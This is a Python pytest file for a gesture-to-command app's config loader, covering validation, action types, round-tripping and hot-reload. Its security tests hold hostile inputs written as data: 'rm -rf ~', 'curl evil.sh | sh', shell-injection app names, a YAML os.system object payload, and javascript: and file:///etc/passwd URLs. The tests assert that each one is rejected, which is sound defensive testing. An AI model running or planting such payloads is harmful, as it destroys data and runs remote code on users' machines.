"""Tests for the declarative command config.

A command config can arrive by download from a website, so it is untrusted
input. The security-shaped tests below are the point of this file: they assert
that a malicious or malformed config is rejected at load rather than executed.
"""

from __future__ import annotations

import json

import pytest
import yaml

from gestureflow.commands import (
    ACTION_TYPES,
    SCHEMA_VERSION,
    CommandConfigError,
    CommandReloader,
    CommandSet,
    load_commands,
    parse_action,
    parse_commands,
)
from gestureflow.utils import PROJECT_ROOT


def cfg_doc(**overrides):
    doc = {
        "version": SCHEMA_VERSION,
        "neutral_label": 0,
        "gestures": [
            {"label": 1, "name": "Spotlight",
             "action": {"type": "hotkey", "keys": ["command", "space"]}},
        ],
    }
    doc.update(overrides)
    return doc


# ---------------------------------------------------------------------------
# The shipped default
# ---------------------------------------------------------------------------

class TestShippedDefault:
    def test_default_config_loads(self):
        commands = load_commands(PROJECT_ROOT / "configs" / "commands.default.yaml")
        assert len(commands.bindings) == 3

    def test_default_reproduces_the_original_bindings(self):
        commands = load_commands(PROJECT_ROOT / "configs" / "commands.default.yaml")
        assert commands.get(1).action.keys == ("command", "space")
        assert commands.get(2).action.keys == ("ctrl", "up")
        assert commands.get(3).action.keys == ("command", "tab")

    def test_default_binds_only_labels_the_model_can_predict(self):
        # Labels 4 and 5 used to be bound to gestures the model could never
        # produce. They are comments in the default file now.
        commands = load_commands(PROJECT_ROOT / "configs" / "commands.default.yaml")
        assert set(commands.labels()) <= {1, 2, 3}


# ---------------------------------------------------------------------------
# Schema validation
# ---------------------------------------------------------------------------

class TestSchemaValidation:
    def test_valid_config_parses(self):
        commands = parse_commands(cfg_doc())
        assert commands.get(1).name == "Spotlight"

    def test_top_level_must_be_a_mapping(self):
        with pytest.raises(CommandConfigError, match="mapping"):
            parse_commands([1, 2, 3])

    def test_unsupported_version_is_rejected(self):
        with pytest.raises(CommandConfigError, match="version"):
            parse_commands(cfg_doc(version=99))

    def test_gestures_must_be_present_and_non_empty(self):
        with pytest.raises(CommandConfigError, match="gestures"):
            parse_commands(cfg_doc(gestures=[]))

    def test_missing_label_is_rejected(self):
        with pytest.raises(CommandConfigError, match="label"):
            parse_commands(cfg_doc(gestures=[
                {"name": "X", "action": {"type": "keypress", "key": "a"}}]))

    def test_missing_name_is_rejected(self):
        with pytest.raises(CommandConfigError, match="name"):
            parse_commands(cfg_doc(gestures=[
                {"label": 1, "action": {"type": "keypress", "key": "a"}}]))

    def test_duplicate_label_is_rejected(self):
        with pytest.raises(CommandConfigError, match="already bound"):
            parse_commands(cfg_doc(gestures=[
                {"label": 1, "name": "A",
                 "action": {"type": "keypress", "key": "a"}},
                {"label": 1, "name": "B",
                 "action": {"type": "keypress", "key": "b"}},
            ]))

    def test_binding_the_neutral_label_is_rejected(self):
        # Neutral is the "no gesture" state; binding it would fire an action
        # continuously whenever the hand was doing nothing.
        with pytest.raises(CommandConfigError, match="neutral"):
            parse_commands(cfg_doc(gestures=[
                {"label": 0, "name": "Oops",
                 "action": {"type": "keypress", "key": "a"}}]))

    def test_boolean_is_not_accepted_as_a_label(self):
        # bool is a subclass of int in Python; True must not become label 1.
        with pytest.raises(CommandConfigError, match="label"):
            parse_commands(cfg_doc(gestures=[
                {"label": True, "name": "X",
                 "action": {"type": "keypress", "key": "a"}}]))

    def test_error_message_names_the_offending_gesture(self):
        with pytest.raises(CommandConfigError) as exc:
            parse_commands(cfg_doc(gestures=[
                {"label": 1, "name": "Spotlight",
                 "action": {"type": "hotkey", "keys": ["comand", "space"]}}]))
        assert "Spotlight" in str(exc.value)
        assert "comand" in str(exc.value)


# ---------------------------------------------------------------------------
# Action types
# ---------------------------------------------------------------------------

class TestActionValidation:
    def test_all_declared_types_are_parseable(self):
        samples = {
            "hotkey": {"type": "hotkey", "keys": ["command", "space"]},
            "keypress": {"type": "keypress", "key": "enter"},
            "media": {"type": "media", "action": "playpause"},
            "launch": {"type": "launch", "app": "Notes"},
            "applescript": {"type": "applescript", "script": "beep"},
            "shell": {"type": "shell", "argv": ["echo", "hi"]},
            "url": {"type": "url", "url": "https://example.com"},
            "text": {"type": "text", "text": "hello"},
            "chord": {"type": "chord",
                      "steps": [{"keys": ["command", "k"]},
                                {"keys": ["enter"], "delay": 0.1}]},
        }
        assert set(samples) == ACTION_TYPES
        for kind, raw in samples.items():
            assert parse_action(raw, "test").type == kind

    def test_unknown_action_type_is_rejected(self):
        with pytest.raises(CommandConfigError, match="unknown action type"):
            parse_action({"type": "eval"}, "test")

    def test_unknown_key_name_is_rejected(self):
        with pytest.raises(CommandConfigError, match="not a recognized key"):
            parse_action({"type": "hotkey", "keys": ["comand", "space"]}, "t")

    def test_keys_are_normalized_to_lowercase(self):
        action = parse_action({"type": "hotkey", "keys": ["Command", "SPACE"]},
                              "t")
        assert action.keys == ("command", "space")

    def test_empty_hotkey_is_rejected(self):
        with pytest.raises(CommandConfigError, match="non-empty"):
            parse_action({"type": "hotkey", "keys": []}, "t")

    def test_absurd_hotkey_length_is_rejected(self):
        with pytest.raises(CommandConfigError, match="at most 5"):
            parse_action({"type": "hotkey",
                          "keys": ["a", "b", "c", "d", "e", "f"]}, "t")

    def test_unknown_media_action_is_rejected(self):
        with pytest.raises(CommandConfigError, match="unknown media action"):
            parse_action({"type": "media", "action": "teleport"}, "t")


class TestNoArbitraryExecution:
    """A downloaded config must not be able to run arbitrary commands."""

    def test_shell_requires_an_argv_list_not_a_string(self):
        # A command *string* would be shell-interpreted somewhere downstream.
        with pytest.raises(CommandConfigError, match="argv"):
            parse_action({"type": "shell", "cmd": "rm -rf ~"}, "t")

    def test_shell_argv_entries_must_be_strings(self):
        with pytest.raises(CommandConfigError, match="string"):
            parse_action({"type": "shell", "argv": ["echo", {"x": 1}]}, "t")

    def test_shell_argv_survives_metacharacters_as_literal_text(self):
        # These stay a single literal argument. Because the action is executed
        # without a shell, they are text passed to echo, not a command chain.
        action = parse_action(
            {"type": "shell", "argv": ["echo", "; rm -rf ~ && curl evil.sh"]},
            "t")
        assert action.argv == ("echo", "; rm -rf ~ && curl evil.sh")
        assert len(action.argv) == 2

    @pytest.mark.parametrize("app", [
        'Notes"; rm -rf ~; echo "',
        "Notes && curl evil.sh | sh",
        "Notes\nrm -rf ~",
        "../../../bin/sh",
        "$(whoami)",
        "`id`",
    ])
    def test_injection_shaped_app_names_are_rejected(self, app):
        with pytest.raises(CommandConfigError, match="not a valid application"):
            parse_action({"type": "launch", "app": app}, "t")

    def test_ordinary_app_names_are_accepted(self):
        for app in ["Notes", "Visual Studio Code", "IINA", "1Password 7",
                    "Adobe Photoshop 2024"]:
            assert parse_action({"type": "launch", "app": app}, "t").app == app

    def test_yaml_cannot_construct_python_objects(self):
        # safe_load, not load: !!python/object tags must not be honoured.
        evil = "!!python/object/apply:os.system ['echo pwned']"
        with pytest.raises(yaml.YAMLError):
            yaml.safe_load(evil)

    def test_oversized_applescript_is_rejected(self):
        with pytest.raises(CommandConfigError, match="4000"):
            parse_action({"type": "applescript", "script": "x" * 5000}, "t")


# ---------------------------------------------------------------------------
# Round-tripping (the web builder exports what the app reads)
# ---------------------------------------------------------------------------

class TestRoundTrip:
    def test_to_dict_reparses_identically(self):
        original = parse_commands(cfg_doc(gestures=[
            {"label": 1, "name": "Spotlight",
             "action": {"type": "hotkey", "keys": ["command", "space"]}},
            {"label": 2, "name": "Notes", "description": "open it",
             "action": {"type": "launch", "app": "Notes"}},
            {"label": 3, "name": "Play",
             "action": {"type": "media", "action": "playpause"}},
        ]))
        reparsed = parse_commands(original.to_dict())
        assert reparsed.to_dict() == original.to_dict()

    def test_yaml_round_trip(self):
        original = parse_commands(cfg_doc())
        reparsed = parse_commands(yaml.safe_load(original.to_yaml()))
        assert reparsed.to_dict() == original.to_dict()

    def test_json_round_trip(self):
        original = parse_commands(cfg_doc())
        reparsed = parse_commands(json.loads(json.dumps(original.to_dict())))
        assert reparsed.to_dict() == original.to_dict()


# ---------------------------------------------------------------------------
# Loading and hot-reload
# ---------------------------------------------------------------------------

class TestLoading:
    def test_missing_file_is_reported_clearly(self, tmp_path):
        with pytest.raises(CommandConfigError, match="No command config"):
            load_commands(tmp_path / "nope.yaml")

    def test_json_config_is_accepted(self, tmp_path):
        path = tmp_path / "commands.json"
        path.write_text(json.dumps(cfg_doc()))
        assert load_commands(path).get(1).name == "Spotlight"

    def test_malformed_yaml_names_the_file(self, tmp_path):
        path = tmp_path / "commands.yaml"
        path.write_text("gestures: [unclosed")
        with pytest.raises(CommandConfigError, match="invalid YAML"):
            load_commands(path)


class TestHotReload:
    def _write(self, path, doc):
        path.write_text(yaml.safe_dump(doc))

    def test_reloads_when_the_file_changes(self, tmp_path):
        path = tmp_path / "commands.yaml"
        self._write(path, cfg_doc())
        reloader = CommandReloader(path, interval=0.0)
        assert reloader.commands.get(1).name == "Spotlight"

        self._write(path, cfg_doc(gestures=[
            {"label": 1, "name": "Renamed",
             "action": {"type": "keypress", "key": "a"}}]))
        import os
        os.utime(path, (0, 0))          # force a distinct mtime

        assert reloader.poll(now=100.0)
        assert reloader.commands.get(1).name == "Renamed"

    def test_broken_edit_keeps_the_previous_config(self, tmp_path):
        path = tmp_path / "commands.yaml"
        self._write(path, cfg_doc())
        reloader = CommandReloader(path, interval=0.0)

        path.write_text("gestures: [")
        import os
        os.utime(path, (0, 0))

        assert not reloader.poll(now=100.0)
        assert reloader.commands.get(1).name == "Spotlight", (
            "a broken edit must not take the running config down with it"
        )

    def test_unchanged_file_does_not_reload(self, tmp_path):
        path = tmp_path / "commands.yaml"
        self._write(path, cfg_doc())
        reloader = CommandReloader(path, interval=0.0)
        assert not reloader.poll(now=100.0)


class TestCommandSetAccessors:
    def test_name_for_falls_back_gracefully(self):
        assert "9" in CommandSet().name_for(9)

    def test_has_and_get(self):
        commands = parse_commands(cfg_doc())
        assert commands.has(1)
        assert not commands.has(7)
        assert commands.get(7) is None

    def test_describe_is_human_readable(self):
        commands = parse_commands(cfg_doc())
        assert commands.get(1).action.describe() == "command + space"


# ---------------------------------------------------------------------------
# Action types added for richer bindings
# ---------------------------------------------------------------------------

class TestUrlAction:
    def test_https_is_accepted(self):
        action = parse_action({"type": "url", "url": "https://example.com"}, "t")
        assert action.url == "https://example.com"

    def test_http_is_accepted(self):
        assert parse_action({"type": "url", "url": "http://a.test"}, "t").url

    @pytest.mark.parametrize("url", [
        "javascript:alert(document.cookie)",
        "JavaScript:alert(1)",
        "file:///etc/passwd",
        "data:text/html;base64,PHNjcmlwdD4=",
        "vbscript:msgbox(1)",
        "about:blank",
        "example.com",              # no scheme at all
    ])
    def test_non_browser_schemes_are_rejected(self, url):
        """A config can arrive by download; the allowlist is the whole defence."""
        with pytest.raises(CommandConfigError, match="http"):
            parse_action({"type": "url", "url": url}, "t")

    def test_line_breaks_are_rejected(self):
        with pytest.raises(CommandConfigError, match="line breaks"):
            parse_action({"type": "url", "url": "https://a.test\nhttps://b"}, "t")

    def test_oversized_urls_are_rejected(self):
        with pytest.raises(CommandConfigError, match="limit"):
            parse_action({"type": "url", "url": "https://a/" + "x" * 3000}, "t")

    def test_query_strings_and_fragments_survive(self):
        url = "https://example.com/a?b=c&d=e#f"
        assert parse_action({"type": "url", "url": url}, "t").url == url


class TestTextAction:
    def test_plain_text_is_accepted(self):
        assert parse_action({"type": "text", "text": "hi there"}, "t").text

    def test_tabs_and_newlines_are_allowed(self):
        """They are real keystrokes with real effects, and often the point."""
        action = parse_action({"type": "text", "text": "a\tb\nc"}, "t")
        assert action.text == "a\tb\nc"

    @pytest.mark.parametrize("bad", ["a\x00b", "a\x07b", "a\x1bb"])
    def test_untypeable_control_characters_are_rejected(self, bad):
        with pytest.raises(CommandConfigError, match="control characters"):
            parse_action({"type": "text", "text": bad}, "t")

    def test_oversized_text_is_rejected(self):
        with pytest.raises(CommandConfigError, match="limit"):
            parse_action({"type": "text", "text": "x" * 5000}, "t")

    def test_empty_text_is_rejected(self):
        with pytest.raises(CommandConfigError, match="text"):
            parse_action({"type": "text", "text": ""}, "t")


class TestChordAction:
    def test_a_sequence_of_hotkeys_is_accepted(self):
        action = parse_action({"type": "chord", "steps": [
            {"keys": ["command", "k"]},
            {"keys": ["enter"], "delay": 0.2},
        ]}, "t")
        assert len(action.steps) == 2
        assert action.steps[0].keys == ("command", "k")
        assert action.steps[1].delay == 0.2

    def test_keys_are_validated_per_step(self):
        with pytest.raises(CommandConfigError, match="not a recognized key"):
            parse_action({"type": "chord",
                          "steps": [{"keys": ["comand", "k"]}]}, "t")

    def test_an_empty_chord_is_rejected(self):
        with pytest.raises(CommandConfigError, match="non-empty"):
            parse_action({"type": "chord", "steps": []}, "t")

    def test_absurd_step_counts_are_rejected(self):
        with pytest.raises(CommandConfigError, match="limited to"):
            parse_action({"type": "chord",
                          "steps": [{"keys": ["a"]}] * 50}, "t")

    def test_a_long_delay_is_rejected(self):
        """A long pause would block every action queued behind it."""
        with pytest.raises(CommandConfigError, match="between 0 and"):
            parse_action({"type": "chord",
                          "steps": [{"keys": ["a"], "delay": 60}]}, "t")

    def test_a_negative_delay_is_rejected(self):
        with pytest.raises(CommandConfigError, match="between 0 and"):
            parse_action({"type": "chord",
                          "steps": [{"keys": ["a"], "delay": -1}]}, "t")

    def test_delay_defaults_when_omitted(self):
        action = parse_action({"type": "chord", "steps": [{"keys": ["a"]}]}, "t")
        assert action.steps[0].delay == 0.05


class TestNewTypesRoundTrip:
    @pytest.mark.parametrize("raw", [
        {"type": "url", "url": "https://example.com/x?y=1"},
        {"type": "text", "text": "kind regards"},
        {"type": "chord", "steps": [{"keys": ["command", "k"], "delay": 0.05},
                                    {"keys": ["enter"], "delay": 0.2}]},
    ])
    def test_yaml_round_trip(self, raw):
        original = parse_commands(cfg_doc(gestures=[
            {"label": 1, "name": "X", "action": raw}]))
        reparsed = parse_commands(yaml.safe_load(original.to_yaml()))
        assert reparsed.to_dict() == original.to_dict()


class TestShippedDefaultV2:
    def _load(self):
        return load_commands(PROJECT_ROOT / "configs" / "commands.default.yaml")

    def test_the_three_original_bindings_are_byte_identical(self):
        """Adding features must not quietly change what the app already did."""
        commands = self._load()
        assert commands.get(1).action.keys == ("command", "space")
        assert commands.get(2).action.keys == ("ctrl", "up")
        assert commands.get(3).action.keys == ("command", "tab")
        assert commands.get(1).name == "Spotlight"
        assert commands.get(2).name == "Mission Control"
        assert commands.get(3).name == "App Switcher"

    def test_the_geometric_gestures_are_bound(self):
        commands = self._load()
        assert set(commands.gesture_names()) == {
            "swipe_left", "swipe_right", "zoom_in", "zoom_out"}

    def test_swipes_map_to_desktop_switching(self):
        commands = self._load()
        assert commands.get_named("swipe_left").action.keys == ("ctrl", "left")
        assert commands.get_named("swipe_right").action.keys == ("ctrl", "right")

    def test_it_declares_version_2(self):
        assert self._load().version == 2

    def test_a_version_1_config_of_the_old_bindings_still_loads(self, tmp_path):
        """Anyone still running the previous default must not be broken."""
        path = tmp_path / "commands.yaml"
        path.write_text(
            "version: 1\nneutral_label: 0\ngestures:\n"
            "  - label: 1\n    name: Spotlight\n"
            "    action: {type: hotkey, keys: [command, space]}\n"
            "  - label: 2\n    name: Mission Control\n"
            "    action: {type: hotkey, keys: [ctrl, up]}\n"
            "  - label: 3\n    name: App Switcher\n"
            "    action: {type: hotkey, keys: [command, tab]}\n"
        )
        commands = load_commands(path)
        assert commands.version == 1
        assert commands.labels() == [1, 2, 3]
        assert commands.gesture_names() == []
